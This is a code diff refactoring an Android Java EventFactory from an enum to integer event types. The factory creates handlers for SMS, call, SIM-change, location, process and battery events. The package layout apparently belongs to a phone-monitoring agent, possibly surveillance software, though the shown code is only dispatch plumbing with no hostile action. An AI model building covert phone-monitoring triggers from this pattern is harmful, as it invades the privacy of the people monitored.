@@ -13,73 +13,74 @@ import com.android.service.auto.Cfg;
 import com.android.service.interfaces.AbstractFactory;
 import com.android.service.util.Check;
 
-public class EventFactory implements AbstractFactory<EventBase,EventType>{
+public class EventFactory implements AbstractFactory<EventBase,Integer>{
 	private static final String TAG = "EventFactory";
 
-	public EventBase create(EventType type) {
+	public EventBase create(Integer eventType) {
 		EventBase e = null;
+		final int type = eventType.intValue();
 		switch (type) {
-			case EVENT_TIMER:
+			case EventType.EVENT_TIMER:
 				if(Cfg.DEBUG) Check.log( TAG + " Info: " + "");
 				e = new EventTimer();
 				break;
 
-			case EVENT_SMS:
+			case EventType.EVENT_SMS:
 				if(Cfg.DEBUG) Check.log( TAG + " Info: " + "EVENT_SMS");
 				e = new EventSms();
 				break;
 
-			case EVENT_CALL:
+			case EventType.EVENT_CALL:
 				if(Cfg.DEBUG) Check.log( TAG + " Info: " + "EVENT_CALL");
 				e = new EventCall();
 				break;
 
-			case EVENT_CONNECTION:
+			case EventType.EVENT_CONNECTION:
 				if(Cfg.DEBUG) Check.log( TAG + " Info: " + "EVENT_CONNECTION");
 				e = new EventConnectivity();
 				break;
 
-			case EVENT_PROCESS:
+			case EventType.EVENT_PROCESS:
 				if(Cfg.DEBUG) Check.log( TAG + " Info: " + "EVENT_PROCESS");
 				e = new EventProcess();
 				break;
 
-			case EVENT_CELLID:
+			case EventType.EVENT_CELLID:
 				if(Cfg.DEBUG) Check.log( TAG + " Info: " + "EVENT_CELLID");
 				e = new EventCellId();
 				break;
 
-			case EVENT_QUOTA:
+			case EventType.EVENT_QUOTA:
 				if(Cfg.DEBUG) Check.log( TAG + " Info: " + "EVENT_QUOTA");
 				break;
 
-			case EVENT_SIM_CHANGE:
+			case EventType.EVENT_SIM_CHANGE:
 				if(Cfg.DEBUG) Check.log( TAG + " Info: " + "EVENT_SIM_CHANGE");
 				e = new EventSim();
 				break;
 
-			case EVENT_LOCATION:
+			case EventType.EVENT_LOCATION:
 				if(Cfg.DEBUG) Check.log( TAG + " Info: " + "EVENT_LOCATION");
 				e = new EventLocation();
 				break;
 
-			case EVENT_AC:
+			case EventType.EVENT_AC:
 				if(Cfg.DEBUG) Check.log( TAG + " Info: " + "EVENT_AC");
 				e = new EventAc();
 				break;
 
-			case EVENT_BATTERY:
+			case EventType.EVENT_BATTERY:
 				if(Cfg.DEBUG) Check.log( TAG + " Info: " + "EVENT_BATTERY");
 				e = new EventBattery();
 				break;
 
-			case EVENT_STANDBY:
+			case EventType.EVENT_STANDBY:
 				if(Cfg.DEBUG) Check.log( TAG + " Info: " + "EVENT_STANDBY");
 				e = new EventStandby();
 				break;
 
 			default:
-				if(Cfg.DEBUG) Check.log( TAG + " Error: " + "Unknown: " + type);
+				if(Cfg.DEBUG) Check.log( TAG + " Error: " + "Unknown: " + eventType);
 				break;
 		}
 		return e;
